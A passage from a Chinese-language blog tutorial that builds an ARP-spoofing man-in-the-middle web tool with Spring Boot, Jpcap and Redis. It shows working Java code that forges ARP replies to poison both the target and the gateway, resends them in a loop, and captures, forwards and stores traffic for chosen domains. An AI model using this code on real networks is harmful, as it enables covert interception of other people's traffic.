  <span class="nc">AttackConfig</span> <span class="n">config</span> <span class="o">=</span> <span class="o">(</span><span class="nc">AttackConfig</span><span class="o">)</span> <span class="n">redisMapper</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="nc">AttackKey</span><span class="o">.</span><span class="na">config</span><span class="o">,</span> <span class="s">"config"</span><span class="o">);</span>
  <span class="k">if</span><span class="o">(</span><span class="n">config</span> <span class="o">==</span> <span class="kc">null</span><span class="o">){</span>
    <span class="o">...</span>

      <span class="c1">//获取本地IP和MAC地址</span>
      <span class="nc">Map</span><span class="o">&lt;</span><span class="nc">String</span><span class="o">,</span> <span class="nc">String</span><span class="o">&gt;</span> <span class="n">addrs</span> <span class="o">=</span> <span class="nc">NetworkUtils</span><span class="o">.</span><span class="na">getLocalAddress</span><span class="o">();</span>
    <span class="k">if</span><span class="o">(</span><span class="n">addrs</span> <span class="o">==</span> <span class="kc">null</span><span class="o">){</span>
      <span class="n">addrs</span> <span class="o">=</span> <span class="nc">NetworkUtils</span><span class="o">.</span><span class="na">getPublicAddress</span><span class="o">();</span>
    <span class="o">}</span>
    <span class="k">if</span><span class="o">(</span><span class="n">addrs</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">){</span>
      <span class="n">srcIP</span> <span class="o">=</span> <span class="n">addrs</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="s">"ip"</span><span class="o">);</span>
      <span class="n">srcMAC</span> <span class="o">=</span> <span class="n">addrs</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="s">"mac"</span><span class="o">);</span>
    <span class="o">}</span><span class="k">else</span><span class="o">{</span>
      <span class="n">logger</span><span class="o">.</span><span class="na">error</span><span class="o">(</span><span class="s">"can not acquire source IP/MAC address"</span><span class="o">);</span>
    <span class="o">}</span>
    <span class="n">config</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">AttackConfig</span><span class="o">();</span>
    <span class="n">config</span><span class="o">.</span><span class="na">setDeviceName</span><span class="o">(</span><span class="kc">null</span><span class="o">);</span>
    <span class="o">...</span>
      <span class="n">config</span><span class="o">.</span><span class="na">setGateMac</span><span class="o">(</span><span class="n">gateMAC</span><span class="o">);</span>
    <span class="n">config</span><span class="o">.</span><span class="na">setGateIP</span><span class="o">(</span><span class="n">gateIP</span><span class="o">);</span>
    <span class="n">redisMapper</span><span class="o">.</span><span class="na">set</span><span class="o">(</span><span class="nc">AttackKey</span><span class="o">.</span><span class="na">config</span><span class="o">,</span> <span class="s">"config"</span><span class="o">,</span> <span class="n">config</span><span class="o">);</span>
  <span class="o">}</span>

<span class="o">}</span>
</pre></table></code></div></div><p>在方法上加<code class="language-plaintext highlighter-rouge">@PostConstruct</code>注解可以让这个方法在web容器启动并初始化Servlet的时候被执行，在Spring IOC容器中是通过<code class="language-plaintext highlighter-rouge">CommonAnnotationBeanPostProcessor</code>实现的。通常我们会是在Spring框架中使用到@PostConstruct注解 该注解的方法在整个Bean初始化中的执行顺序：</p><p><code class="language-plaintext highlighter-rouge">Constructor</code>(构造方法) -&gt; <code class="language-plaintext highlighter-rouge">@Autowired</code>(依赖注入) -&gt; <code class="language-plaintext highlighter-rouge">@PostConstruct</code>(注释的方法)</p><h3 id="53-获取网卡列表">5.3 获取网卡列表</h3><p>编写<code class="language-plaintext highlighter-rouge">AttackController</code>，获取网卡列表，并序列化返回给前端。</p><div class="language-java highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
</pre><td class="rouge-code"><pre><span class="cm">/**
 * @author kol Huang
 * @date 2021/3/22
 */</span>
<span class="nd">@Controller</span>
<span class="nd">@RequestMapping</span><span class="o">(</span><span class="s">"attack"</span><span class="o">)</span>
<span class="kd">public</span> <span class="kd">class</span> <span class="nc">AttackController</span> <span class="o">{</span>

    <span class="nd">@Autowired</span>
    <span class="kd">private</span> <span class="nc">AttackService</span> <span class="n">attackService</span><span class="o">;</span>

    <span class="nd">@GetMapping</span><span class="o">(</span><span class="n">value</span> <span class="o">=</span> <span class="s">"/getDeviceList"</span><span class="o">)</span>
    <span class="nd">@ResponseBody</span>
    <span class="kd">public</span> <span class="nc">List</span><span class="o">&lt;</span><span class="nc">NetWorkInterface</span><span class="o">&gt;</span> <span class="nf">getDeviceList</span><span class="o">(){</span>
        <span class="nc">List</span><span class="o">&lt;</span><span class="nc">NetWorkInterface</span><span class="o">&gt;</span> <span class="n">devices</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ArrayList</span><span class="o">&lt;&gt;();</span>
        <span class="nc">NetworkInterface</span><span class="o">[]</span> <span class="n">interfaces</span> <span class="o">=</span> <span class="n">attackService</span><span class="o">.</span><span class="na">getDevices</span><span class="o">();</span>
        <span class="k">if</span><span class="o">(</span><span class="n">interfaces</span> <span class="o">!=</span> <span class="kc">null</span><span class="o">){</span>
            <span class="k">for</span> <span class="o">(</span><span class="nc">NetworkInterface</span> <span class="n">networkInterface</span> <span class="o">:</span> <span class="n">interfaces</span><span class="o">)</span> <span class="o">{</span>
                <span class="nc">NetWorkInterface</span> <span class="n">ni</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">NetWorkInterface</span><span class="o">();</span>
                <span class="n">ni</span><span class="o">.</span><span class="na">setName</span><span class="o">(</span><span class="n">networkInterface</span><span class="o">.</span><span class="na">name</span><span class="o">);</span>
                <span class="n">ni</span><span class="o">.</span><span class="na">setDescription</span><span class="o">(</span><span class="n">networkInterface</span><span class="o">.</span><span class="na">description</span><span class="o">);</span>
                <span class="n">ni</span><span class="o">.</span><span class="na">setDataLinkName</span><span class="o">(</span><span class="n">networkInterface</span><span class="o">.</span><span class="na">datalink_name</span><span class="o">);</span>
                <span class="n">ni</span><span class="o">.</span><span class="na">setDataLinkDescription</span><span class="o">(</span><span class="n">networkInterface</span><span class="o">.</span><span class="na">datalink_description</span><span class="o">);</span>
                <span class="n">devices</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="n">ni</span><span class="o">);</span>
            <span class="o">}</span>
        <span class="o">}</span>
        <span class="k">return</span> <span class="n">devices</span><span class="o">;</span>
    <span class="o">}</span>
<span class="o">}</span>

</pre></table></code></div></div><p>启动项目，发起请求：<code class="language-plaintext highlighter-rouge">http://localhost:8081/attack/getDeviceList</code>，结果如下</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://hyc-pic.oss-cn-hangzhou.aliyuncs.com/image-20210323214332832.png" alt="image-20210323214332832" /></p><h3 id="54-接口对接测试">5.4 接口对接测试</h3><p>既然已经编写好了一个接口，那么我们就尝试着跟前端模块对接一下，防止项目庞大后对接问题的堆积。</p><p>修改前端模块的<code class="language-plaintext highlighter-rouge">attack.service.ts</code>文件，将<code class="language-plaintext highlighter-rouge">/getDeviceList</code>请求路径改写成我们自己的请求路径：</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://hyc-pic.oss-cn-hangzhou.aliyuncs.com/image-20210324204211899.png" alt="image-20210324204211899" /></p><p>分别启动angular项目和springboot项目，注意：这里应当用<code class="language-plaintext highlighter-rouge">proxy</code>的方式启动前端项目，将<code class="language-plaintext highlighter-rouge">localhost:8081</code>作为代理处理请求。</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://hyc-pic.oss-cn-hangzhou.aliyuncs.com/image-20210324204458217.png" alt="image-20210324204458217" /></p><p>结果：前端成功获取并显示了所有网卡名称。</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://hyc-pic.oss-cn-hangzhou.aliyuncs.com/image-20210324204611650.png" alt="image-20210324204611650" /></p><h3 id="55-攻击核心代码">5.5 攻击核心代码</h3><p>此项目的其中一个核心功能就是对抓取的网络数据包进行一系列操作，如分组、拼接、解压、还原等。所以就不再描述其他细节问题，重点讲讲上述核心功能的实现。</p><p>首先，在前端页面上初次填写攻击配置信息（srcIP, dstIP, gateIP等）后，点击setup configs按钮，后端会接收到一个路径为<code class="language-plaintext highlighter-rouge">attack/updateConfigAndOpenDevice</code>的请求。随即根据表单的数据更新攻击配置信息（存入redis），然后根据配置信息选择网卡，并调用以下两个来自Jpcap包的方法打开网卡设备：</p><div class="language-java highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="kd">public</span> <span class="kd">static</span> <span class="n">jpcap</span><span class="o">.</span><span class="na">JpcapCaptor</span> <span class="nf">openDevice</span><span class="o">(</span><span class="n">jpcap</span><span class="o">.</span><span class="na">NetworkInterface</span> <span class="n">intrface</span><span class="o">,</span> <span class="kt">int</span> <span class="n">snaplen</span><span class="o">,</span> <span class="kt">boolean</span> <span class="n">promisc</span><span class="o">,</span> <span class="kt">int</span> <span class="n">to_ms</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">java</span><span class="o">.</span><span class="na">io</span><span class="o">.</span><span class="na">IOException</span>
<span class="kd">public</span> <span class="n">jpcap</span><span class="o">.</span><span class="na">JpcapSender</span> <span class="nf">getJpcapSenderInstance</span><span class="o">()</span>
</pre></table></code></div></div><p>然后等待前端下达指令就开始抓包。</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://hyc-pic.oss-cn-hangzhou.aliyuncs.com/image-20210325192544852.png" alt="image-20210325192544852" /></p><p>这里遇到了一个问题，我在使用redisTemplate从redisget配置信息的时候报错，如下：</p><div class="language-shell highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>java.lang.ClassCastException: java.util.LinkedHashMap cannot be cast to com.XXX.XXX.xxClass
</pre></table></code></div></div><p>从redis反序列化出来的时候，所有的对象都变成了LinkedHashMap。</p><p>查了资料，原因是：在配置redisconfig的时候，我定义的MyObjectMapper没有配置<code class="language-plaintext highlighter-rouge">DefaultTyping</code>属性，jackson将使用简单的数据绑定具体的java类型，其中Object就会在反序列化的时候变成LinkedHashMap。如何解决呢？</p><p>解决办法就是在get之后用<code class="language-plaintext highlighter-rouge">ObjectMapper</code>来转换：</p><div class="language-java highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="kd">public</span> <span class="nc">Object</span> <span class="nf">get</span><span class="o">(</span><span class="nc">KeyPrefix</span> <span class="n">prefix</span><span class="o">,</span> <span class="nc">String</span> <span class="n">key</span><span class="o">,</span> <span class="nc">Class</span><span class="o">&lt;?&gt;</span> <span class="n">clazz</span><span class="o">){</span>
  <span class="nc">String</span> <span class="n">realKey</span> <span class="o">=</span> <span class="n">prefix</span><span class="o">.</span><span class="na">getPrefix</span><span class="o">().</span><span class="na">concat</span><span class="o">(</span><span class="n">key</span><span class="o">);</span>
  <span class="nc">ObjectMapper</span> <span class="n">mapper</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ObjectMapper</span><span class="o">();</span>
  <span class="k">return</span> <span class="n">mapper</span><span class="o">.</span><span class="na">convertValue</span><span class="o">(</span><span class="n">redisTemplate</span><span class="o">.</span><span class="na">opsForValue</span><span class="o">().</span><span class="na">get</span><span class="o">(</span><span class="n">realKey</span><span class="o">),</span> <span class="n">clazz</span><span class="o">);</span>
<span class="o">}</span>
</pre></table></code></div></div><p>但是问题应该是出在<code class="language-plaintext highlighter-rouge">RedisConfig</code>的配置中，先不处理它。</p><h4 id="551-伪装">5.5.1 伪装</h4><p>接下来开始编写攻击代码，攻击走的请求路径是<code class="language-plaintext highlighter-rouge">/attack/startAttack</code>，所以我们在<code class="language-plaintext highlighter-rouge">AttackController</code>中编写攻击的代码：</p><div class="language-java highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="nd">@GetMapping</span><span class="o">(</span><span class="s">"/startAttack"</span><span class="o">)</span>
<span class="nd">@ResponseBody</span>
<span class="kd">public</span> <span class="nc">ResultDTO</span> <span class="nf">startAttacking</span><span class="o">(){</span>
  <span class="n">logger</span><span class="o">.</span><span class="na">info</span><span class="o">(</span><span class="s">"start attacking"</span><span class="o">);</span>
  <span class="n">attackService</span><span class="o">.</span><span class="na">attack</span><span class="o">();</span>
  <span class="k">return</span> <span class="k">new</span> <span class="nf">ResultDTO</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
<span class="o">}</span>
</pre></table></code></div></div><p>去调用Service层的<code class="language-plaintext highlighter-rouge">attack</code>方法执行攻击流程。</p><p>首先是创建用于spoofing的ARP包：</p><ol><li>创建一个ARP包发送给目标主机，将自己伪装成网关；</li><li>创建一个ARP包发送给网关，将自己伪装成目标主机。</li></ol><div class="language-java highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
</pre><td class="rouge-code"><pre><span class="kd">public</span> <span class="kd">synchronized</span> <span class="kt">void</span> <span class="nf">attack</span><span class="o">(){</span>
  <span class="c1">//当前处于攻击状态，说明已经有线程在攻击了，所以当前线程直接返回</span>
  <span class="k">if</span><span class="o">(</span><span class="n">attacking</span><span class="o">)</span>   <span class="k">return</span><span class="o">;</span>
  <span class="n">attacking</span> <span class="o">=</span> <span class="kc">true</span><span class="o">;</span>

  <span class="n">startAttackTimeStamp</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Date</span><span class="o">();</span><span class="c1">//记录当前时间</span>
  <span class="c1">//为了方便统计数据，我们为每次攻击都设置一个批次ID，即batchId</span>
  <span class="c1">//这个batchId需要是自增的，如何获取一个自增的batchId呢？</span>
  <span class="c1">//那就还从redis里取，但是这个batchId必须跟每次攻击的数据包对应好，否则就乱了</span>
  <span class="c1">//OK，那我们就在初始化Servlet的时候，就在Redis里设置一个存id的键，如果不存在，那就创建一个，具体操作见方法initBatchId</span>
  <span class="n">batchId</span> <span class="o">=</span> <span class="o">(</span><span class="nc">Integer</span><span class="o">)</span> <span class="n">redisMapper</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="nc">CommonKey</span><span class="o">.</span><span class="na">COMMON_KEY</span><span class="o">,</span> <span class="s">"batch_id"</span><span class="o">,</span> <span class="nc">Integer</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
  <span class="c1">//这里没考虑并发修改redis的batchId的问题，因为同一时间只有一个线程会执行攻击方法</span>
  <span class="c1">//因为AttackService默认是单例的，锁上之后，别的线程也没法调用attack方法，也就不会并发修改batchId</span>
  <span class="c1">//但是仍旧是线程不安全的，如果要实现线程安全，可以选择加分布式锁，即执行redis的set lock:batchid true ex 5 nx</span>
  <span class="c1">//这里就不实现了</span>
  <span class="n">batchId</span><span class="o">++;</span>

  <span class="c1">//设置ARP包欺骗目标主机，将自己伪装成网关</span>
  <span class="nc">ARPPacket</span> <span class="n">arpToDst</span> <span class="o">=</span> <span class="n">createARPPacket</span><span class="o">(</span><span class="n">srcMACBT</span><span class="o">,</span> <span class="n">gateIPIA</span><span class="o">.</span><span class="na">getAddress</span><span class="o">(),</span> <span class="n">dstMACBT</span><span class="o">,</span> <span class="n">dstIPIA</span><span class="o">.</span><span class="na">getAddress</span><span class="o">());</span>


  <span class="c1">//设置ARP包欺骗网关，假装自己是目标主机，因此源IP地址需要改成攻击目标的IP地址，但是MAC地址修改成本地主机的MAC地址</span>
  <span class="c1">//这样就能让网关认为本地主机的MAC地址是攻击目标的MAC地址，进而将需要发到目标主机的数据包通过ARP表发到本地主机的网卡上</span>
  <span class="nc">ARPPacket</span> <span class="n">arpToGate</span> <span class="o">=</span> <span class="n">createARPPacket</span><span class="o">(</span><span class="n">srcMACBT</span><span class="o">,</span> <span class="n">dstIPIA</span><span class="o">.</span><span class="na">getAddress</span><span class="o">(),</span> <span class="n">gateMACBT</span><span class="o">,</span> <span class="n">gateIPIA</span><span class="o">.</span><span class="na">getAddress</span><span class="o">());</span>

	<span class="o">...</span>
<span class="o">}</span>
</pre></table></code></div></div><p>创建ARP包的方法如下：</p><div class="language-java highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre><td class="rouge-code"><pre><span class="kd">private</span> <span class="nc">ARPPacket</span> <span class="nf">createARPPacket</span><span class="o">(</span><span class="kt">byte</span><span class="o">[]</span> <span class="n">sHardAddr</span><span class="o">,</span> <span class="kt">byte</span><span class="o">[]</span> <span class="n">sProtoAddr</span><span class="o">,</span><span class="kt">byte</span><span class="o">[]</span> <span class="n">tHardAddr</span><span class="o">,</span> <span class="kt">byte</span><span class="o">[]</span> <span class="n">tProtoAddr</span><span class="o">){</span>
  <span class="nc">ARPPacket</span> <span class="n">arpPacket</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ARPPacket</span><span class="o">();</span>
  <span class="n">arpPacket</span><span class="o">.</span><span class="na">hardtype</span> <span class="o">=</span> <span class="nc">ARPPacket</span><span class="o">.</span><span class="na">HARDTYPE_ETHER</span><span class="o">;</span>
  <span class="n">arpPacket</span><span class="o">.</span><span class="na">prototype</span> <span class="o">=</span> <span class="nc">ARPPacket</span><span class="o">.</span><span class="na">PROTOTYPE_IP</span><span class="o">;</span>
  <span class="n">arpPacket</span><span class="o">.</span><span class="na">operation</span> <span class="o">=</span> <span class="nc">ARPPacket</span><span class="o">.</span><span class="na">ARP_REPLY</span><span class="o">;</span><span class="c1">//设置操作类型为应答</span>
  <span class="n">arpPacket</span><span class="o">.</span><span class="na">hlen</span> <span class="o">=</span> <span class="mi">6</span><span class="o">;</span><span class="c1">//硬件地址长度</span>
  <span class="n">arpPacket</span><span class="o">.</span><span class="na">plen</span> <span class="o">=</span> <span class="mi">4</span><span class="o">;</span><span class="c1">//协议类型长度</span>
  <span class="n">arpPacket</span><span class="o">.</span><span class="na">sender_hardaddr</span> <span class="o">=</span> <span class="n">sHardAddr</span><span class="o">;</span><span class="c1">//发送端MAC地址</span>
  <span class="n">arpPacket</span><span class="o">.</span><span class="na">sender_protoaddr</span> <span class="o">=</span> <span class="n">sProtoAddr</span><span class="o">;</span><span class="c1">//发送端IP地址</span>
  <span class="n">arpPacket</span><span class="o">.</span><span class="na">target_hardaddr</span> <span class="o">=</span> <span class="n">tHardAddr</span><span class="o">;</span><span class="c1">//目标MAC地址</span>
  <span class="n">arpPacket</span><span class="o">.</span><span class="na">target_protoaddr</span> <span class="o">=</span> <span class="n">tProtoAddr</span><span class="o">;</span><span class="c1">//目标IP地址</span>

  <span class="c1">//定义以太网首部</span>
  <span class="nc">EthernetPacket</span> <span class="n">ethernetPacket</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">EthernetPacket</span><span class="o">();</span>
  <span class="n">ethernetPacket</span><span class="o">.</span><span class="na">frametype</span> <span class="o">=</span> <span class="nc">EthernetPacket</span><span class="o">.</span><span class="na">ETHERTYPE_ARP</span><span class="o">;</span><span class="c1">//设置帧类型为ARP帧</span>
  <span class="n">ethernetPacket</span><span class="o">.</span><span class="na">src_mac</span> <span class="o">=</span> <span class="n">sHardAddr</span><span class="o">;</span><span class="c1">//源MAC地址</span>
  <span class="n">ethernetPacket</span><span class="o">.</span><span class="na">dst_mac</span> <span class="o">=</span> <span class="n">tHardAddr</span><span class="o">;</span><span class="c1">//目标MAC地址</span>
  <span class="c1">//添加以太网首部</span>
  <span class="n">arpPacket</span><span class="o">.</span><span class="na">datalink</span> <span class="o">=</span> <span class="n">ethernetPacket</span><span class="o">;</span>
  <span class="k">return</span> <span class="n">arpPacket</span><span class="o">;</span>
<span class="o">}</span>
</pre></table></code></div></div><h4 id="552-欺骗">5.5.2 欺骗</h4><p>伪装包已经创建好了，那就开始欺骗吧。原项目中直接<code class="language-plaintext highlighter-rouge">new</code>线程发包了，我改一下，我用线程池。</p><div class="language-java highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre><span class="c1">//使用线程池</span>
<span class="kd">private</span> <span class="kd">static</span> <span class="kd">final</span> <span class="kt">int</span> <span class="no">CORE_POOL_SIZE</span> <span class="o">=</span> <span class="mi">5</span><span class="o">;</span><span class="c1">//核心线程数</span>
<span class="kd">private</span> <span class="kd">static</span> <span class="kd">final</span> <span class="kt">int</span> <span class="no">MAXIMUM_POOL_SIZE</span> <span class="o">=</span> <span class="mi">10</span><span class="o">;</span><span class="c1">//最大线程数</span>
<span class="kd">private</span> <span class="kd">static</span> <span class="kd">final</span> <span class="kt">long</span> <span class="no">KEEP_ALIVE_TIME</span> <span class="o">=</span> <span class="mi">1L</span><span class="o">;</span><span class="c1">//空闲保活时间</span>
<span class="kd">private</span> <span class="kd">static</span> <span class="kd">final</span> <span class="nc">TimeUnit</span> <span class="no">UNIT</span> <span class="o">=</span> <span class="nc">TimeUnit</span><span class="o">.</span><span class="na">MILLISECONDS</span><span class="o">;</span><span class="c1">//时间单位</span>
<span class="kd">private</span> <span class="kd">static</span> <span class="kd">final</span> <span class="kt">int</span> <span class="no">QUEUE_CAPACITY</span> <span class="o">=</span> <span class="mi">5</span><span class="o">;</span><span class="c1">//任务队列最大长度</span>
<span class="kd">static</span> <span class="nc">ThreadPoolExecutor</span> <span class="n">executor</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">ThreadPoolExecutor</span><span class="o">(</span>
  <span class="no">CORE_POOL_SIZE</span><span class="o">,</span>
  <span class="no">MAXIMUM_POOL_SIZE</span><span class="o">,</span>
  <span class="no">KEEP_ALIVE_TIME</span><span class="o">,</span>
  <span class="no">UNIT</span><span class="o">,</span>
  <span class="k">new</span> <span class="nc">ArrayBlockingQueue</span><span class="o">&lt;&gt;(</span><span class="no">QUEUE_CAPACITY</span><span class="o">),</span><span class="c1">//有界阻塞队列</span>
  <span class="k">new</span> <span class="nc">ThreadPoolExecutor</span><span class="o">.</span><span class="na">CallerRunsPolicy</span><span class="o">()</span><span class="c1">//饱和策略选择调用线程帮忙的策略</span>
<span class="o">);</span>
</pre></table></code></div></div><p>发包：</p><div class="language-java highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
</pre><td class="rouge-code"><pre><span class="c1">//主线程调用方法，子线程发包</span>
<span class="n">sendPacket</span><span class="o">(</span><span class="n">arpToDst</span><span class="o">,</span> <span class="n">arpToGate</span><span class="o">);</span>


<span class="kd">private</span> <span class="kt">void</span> <span class="nf">sendPacket</span><span class="o">(</span><span class="nc">Packet</span> <span class="n">packet1</span><span class="o">,</span> <span class="nc">Packet</span> <span class="n">packet2</span><span class="o">){</span>
  <span class="nc">Runnable</span> <span class="n">task</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Runnable</span><span class="o">()</span> <span class="o">{</span>
    <span class="nd">@Override</span>
    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">run</span><span class="o">()</span> <span class="o">{</span>
      <span class="k">while</span><span class="o">(</span><span class="n">attacking</span><span class="o">){</span>
        <span class="k">try</span><span class="o">{</span>
          <span class="k">if</span><span class="o">(</span><span class="n">sender</span> <span class="o">!=</span> <span class="kc">null</span> <span class="o">&amp;&amp;</span> <span class="n">attacking</span><span class="o">){</span>
            <span class="n">sender</span><span class="o">.</span><span class="na">sendPacket</span><span class="o">(</span><span class="n">packet1</span><span class="o">);</span>
          <span class="o">}</span>
          <span class="k">if</span><span class="o">(</span><span class="n">sender</span> <span class="o">!=</span> <span class="kc">null</span> <span class="o">&amp;&amp;</span> <span class="n">attacking</span><span class="o">){</span>
            <span class="n">sender</span><span class="o">.</span><span class="na">sendPacket</span><span class="o">(</span><span class="n">packet2</span><span class="o">);</span>
          <span class="o">}</span>
          <span class="c1">//控制发包的速度</span>
          <span class="nc">Thread</span><span class="o">.</span><span class="na">sleep</span><span class="o">(</span><span class="mi">500</span><span class="o">);</span>
        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">Throwable</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
          <span class="n">logger</span><span class="o">.</span><span class="na">error</span><span class="o">(</span><span class="s">"Unknown error occur in send thread, "</span><span class="o">,</span> <span class="n">e</span><span class="o">);</span>
        <span class="o">}</span>
      <span class="o">}</span>
    <span class="o">}</span>
  <span class="o">};</span>
  <span class="n">executor</span><span class="o">.</span><span class="na">execute</span><span class="o">(</span><span class="n">task</span><span class="o">);</span>
<span class="o">}</span>
</pre></table></code></div></div><p>发完包之后，就可以准备接收并转发包，因为网关和目标主机会响应这些ARP请求。</p><p>我们在配置攻击参数的时候，设置了<code class="language-plaintext highlighter-rouge">filterDomains</code>参数，即我们只抓取与这些域名相关的数据包。所以我们从网卡拿包的时候，需要进行过滤。过滤完之后，针对数据包的不同类型执行不同的转发操作：</p><ul><li>如果是上行链路，转发到网关</li><li>如果是下行链路，转发到目标主机</li></ul><p>同时将数据包按批次号保存到redis，以便后续分析。</p><div class="language-java highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
</pre><td class="rouge-code"><pre><span class="kd">private</span> <span class="kt">void</span> <span class="nf">receiveAndForwardingPacket</span><span class="o">(){</span>
  <span class="nc">Runnable</span> <span class="n">task</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">Runnable</span><span class="o">()</span> <span class="o">{</span>
    <span class="nd">@Override</span>
    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">run</span><span class="o">()</span> <span class="o">{</span>
      <span class="k">while</span><span class="o">(</span><span class="n">attacking</span><span class="o">){</span>
        <span class="k">try</span><span class="o">{</span>
          <span class="c1">//接收数据包</span>
          <span class="nc">Packet</span> <span class="n">packet</span> <span class="o">=</span> <span class="n">captor</span><span class="o">.</span><span class="na">getPacket</span><span class="o">();</span>
          <span class="k">if</span><span class="o">(</span><span class="n">packet</span> <span class="o">!=</span> <span class="kc">null</span> <span class="o">&amp;&amp;</span> <span class="n">packet</span> <span class="o">!=</span> <span class="nc">Packet</span><span class="o">.</span><span class="na">EOF</span><span class="o">){</span>
            <span class="c1">//检查是否是IP包</span>
            <span class="k">if</span><span class="o">(</span><span class="n">packet</span> <span class="k">instanceof</span> <span class="nc">IPPacket</span><span class="o">){</span>
              <span class="nc">IPPacket</span> <span class="n">ipPacket</span> <span class="o">=</span> <span class="o">(</span><span class="nc">IPPacket</span><span class="o">)</span> <span class="n">packet</span><span class="o">;</span>
              <span class="c1">//数据包属于filterDomain</span>
              <span class="k">if</span><span class="o">(</span><span class="n">isRelatedToSpecificDomains</span><span class="o">(</span><span class="n">ipPacket</span><span class="o">.</span><span class="na">src_ip</span><span class="o">.</span><span class="na">getHostAddress</span><span class="o">())</span>
                 <span class="o">||</span> <span class="n">isRelatedToSpecificDomains</span><span class="o">(</span><span class="n">ipPacket</span><span class="o">.</span><span class="na">dst_ip</span><span class="o">.</span><span class="na">getHostAddress</span><span class="o">())){</span>
                <span class="c1">//将数据包转发到目标主机并保存到数据库</span>

                <span class="c1">//如果这个数据包的源IP地址是目标主机的IP地址，那么说明是上行链路的数据包</span>
                <span class="k">if</span><span class="o">(</span><span class="n">ipPacket</span><span class="o">.</span><span class="na">src_ip</span><span class="o">.</span><span class="na">getHostAddress</span><span class="o">().</span><span class="na">equals</span><span class="o">(</span><span class="n">config</span><span class="o">.</span><span class="na">getDestIp</span><span class="o">())){</span>
                  <span class="c1">//如果这个数据包的源MAC地址是本地主机的MAC地址，说明这是我自己发送的攻击数据包，需要忽略</span>
                  <span class="k">if</span><span class="o">(</span><span class="n">packet</span><span class="o">.</span><span class="na">datalink</span> <span class="k">instanceof</span> <span class="nc">EthernetPacket</span><span class="o">){</span>
                    <span class="nc">EthernetPacket</span> <span class="n">eth</span> <span class="o">=</span> <span class="o">(</span><span class="nc">EthernetPacket</span><span class="o">)</span> <span class="n">packet</span><span class="o">.</span><span class="na">datalink</span><span class="o">;</span>
                    <span class="nc">String</span> <span class="n">macFromCap</span> <span class="o">=</span> <span class="n">eth</span><span class="o">.</span><span class="na">getSourceAddress</span><span class="o">();</span>
                    <span class="k">if</span><span class="o">(!</span><span class="n">macFromCap</span><span class="o">.</span><span class="na">equalsIgnoreCase</span><span class="o">(</span><span class="n">config</span><span class="o">.</span><span class="na">getSrcMac</span><span class="o">())){</span>
                      <span class="n">savePacket</span><span class="o">(</span><span class="n">ipPacket</span><span class="o">,</span> <span class="kc">true</span><span class="o">);</span>
                    <span class="o">}</span>
                  <span class="o">}</span>
                  <span class="n">forward</span><span class="o">(</span><span class="n">ipPacket</span><span class="o">,</span> <span class="n">gateMACBT</span><span class="o">);</span>
                <span class="o">}</span>
